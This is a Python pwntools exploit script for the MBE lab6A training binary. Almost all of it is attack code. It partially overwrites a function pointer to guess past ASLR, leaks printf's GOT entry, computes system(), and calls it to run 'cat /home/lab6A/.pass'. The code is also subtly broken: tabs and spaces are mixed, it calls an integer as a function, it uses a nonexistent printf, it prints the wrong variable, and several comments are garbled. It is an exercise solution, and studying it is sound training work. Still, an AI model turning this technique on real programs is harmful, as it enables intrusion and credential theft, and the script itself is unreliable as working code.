# Based on https://github.com/ewilded/MBE-snippets/blob/master/lab6B/exploit_remote.py
from pwn import *

settings = {

    # Path to binary
    "binary"        : "./lab6A",

    # Path to custom libc
    "libc"          : None,
}

# Exploit here
def exploit():

    # Available variables
    # p      => Tubes! (http://docs.pwntools.com/en/stable/tubes.html)
    # binary => ELF of binary

    # Chose action 1 (setup account).
    p.sendlineafter("Enter Choice: ", "1")  
	
    # Send the name (31 characters + newline -> 32 chars)	
    p.recvuntil("Enter your name: ")		
    payload = "A" * 0x1f # 31 A's (just to fill the username)
    p.sendline(payload)
	
	# Send the description - 90 characters + EXACTLY TWO BYTES to partially overwrite the function pointer.
	# To avoid a newline creeping in and fucking up the second byte of the address (out of bound of our PARTIAL write)
	# we want to use send_raw() instead of sendline()/sendlineafter():
    p.recvuntil("Enter your description: ")
    payload = "B" * 0x5a # exactly ninety bytes to attain the saved print_listing() address
    payload = payload + p16(0xbbe2)
    p.send(payload)
    
    # OK, call this thing:
    p.sendlineafter("Enter Choice: ", "3")
	
    # Analyze the leak (we have to introduce a way to distinguish when the execution was successful as opposed to when we crashed the thing due to the lack of lack with ASLR and our fixed 0xb halfbyte).
    try:
        leak = p.recv()
	
    except EOFError:
	    print("No luck with ASLR this time.")
	    return 1	# let's return 1 to indicate that the program crashed, which means we failed with our guess of the ASLR-ed halfbyte and that the exploit() function must call this method again
    except:
       print("Another exception occured.")
       return 2

	# Some verbose output for debugging/troubleshooting purpose 
    # (this is redundant with context.log_level='debug' though).
    print("ASLR guess successful, below is the entire leak:") 
    print(leak)

    print_name_addr = u32(leak[0xaa:0xae]) # bytes 170:174 contain the address	
    print("print_name()'s current address: %x", hex(print_name_addr))
	
    # Calculate the base of the code segment:
    base_code = print_name_addr & 0xfffff000
    print("Leaked address base of the text segment: %x", hex(base_code))	
	
    # Calculate the base of the data segment:
    base_data = base_code + 0x3000
    print("Calculated base of the data segment: %x", hex(base_data))
    # This is where GOT for printf is held (we have to leak it with write_wrap())
    printf_got_addr = base_data + 0x10

    print("Calculated address of the printf@got entry: %x", hex(printf_got_addr))
    # Calculate the write_wrap_address based on the known offset and the code segment base we have already leaked
    write_wrap_addr = base_code + 0x97a
    print("Calculated address of the write_wrap() function: %x", hex(write_wrap_addr())
	
    # Now, we overflow the setup_account() once again.
    # We want our payload to achieve two things at the same time:
    # 1) overwrite the merchanf.sfunc() address once again, this time with write_wrap()'s address
	# 2) put the printf_got_addr at the beginning of the merchant buffer (user.name), because after when when we issue another call below:
	#  ((void (*) (struct uinfo *) ) merchant.sfunc) (&merchant);it is going to become the argument for the 
	# the address pointed by merchant is going to be the argument (which is exactly what we want, we want to pass the GOT to the write_wrap() call, so it prints
	# the libc printf() address to us.
    print("Overflowing again to overwrite merchant.sfunc with write_wrap() address...")
	p.sendlineafter("Enter Choice: ", "1") 
    p.recvuntil("Enter your name: ")		
    payload = p32(printf_got_addr)	# this will be the argument to write_wrap() once we call it vis merchant.sfunc(&merchant)
	payload = payload.ljust(0x1f,"A") # fill up with A's so it's exactly 31 bytes long after putting the printf_got_addr there
    p.sendline(payload)	
	
    p.recvuntil("Enter your description: ")
    payload = "B" * 0x5a # exactly ninety bytes to overwrite with write_wrap_addr
    payload = payload + p32(write_wrap_addr)
    p.send(payload)
	
    # Then we leak the printf() address by entering 3).
    p.sendlineafter("Enter Choice: ", "3")
    try:
        leak = p.recv()
    except:
	    print("We did something wrong, the program has most likely crashed after the second overflow (trying to leak libc's printf() addr from GOT).")
		exit(1)
    # Now we extract it:
    printf_libc_addr = u32(leak[0x0:0x4])
	print("Leaked printf() libc address: %x", hex(printf_libc_addr))
	
    # Then calculate the system() address.
	system_libc_addr = printf_libc_addr - 0xd0f0
	printf("Calculated system() libc address: %x", hex(printf_libc_addr))
	
    # Then we issue the setup_account() overflow for the third time, this time by putting an arbitrary string (our command to execute by sh) at the beginning of the merchant buffer (merchant.name), while putting system()'s address after the 90 characters of the description property (overwriting the sfunc pointer for the third time).
	
    print("Overflowing again (third time!), this time to overwrite merchant.sfunc with system() address...")
	p.sendlineafter("Enter Choice: ", "1") 
    p.recvuntil("Enter your name: ")		
    payload = "cat /home/lab6A/.pass;"	# this will be the argument to write_wrap() once we call it vis merchant.sfunc(&merchant)
	payload = payload.ljust(0x1f,"#") # fill up with # so it's exactly 31 bytes long after putting the pass-stealing payload there, the rest of the buffer should be ignored as an argument to cat when passed (the desc buffer)
    p.sendline(payload)	
	
    p.recvuntil("Enter your description: ")
    payload = "B" * 0x5a # exactly ninety bytes to overwrite with system() address
    payload = payload + p32(system_libc_addr)
    p.send(payload)
	
    # Then we execute system("cat /home/lab6A/.pass;#######BBBBB...whatever") by entering 3).
    p.sendlineafter("Enter Choice: ", "3")
	
	print("The password should be on the screen.")

    try:
        leak = p.recv()
    except:
	    print("We did something wrong, the program has most likely crashed after the third overflow (trying to steal the password()).")
		exit(1)
	
	# Then we get our code execution by entering 3).
    p.sendlineafter("Enter Choice: ", "3")
	
    return 0

# Initial setup
if __name__  == "__main__":
	
    binary = ELF(settings['binary'])
    context.log_level = 'debug'
    p = None

    if settings['libc']:
        binary.libc = ELF(settings['libc'])

    p = process(binary.path)
    while(exploit()): # this will NOT return if successful (instead, it's gonna hang on the shell :))
	    pass
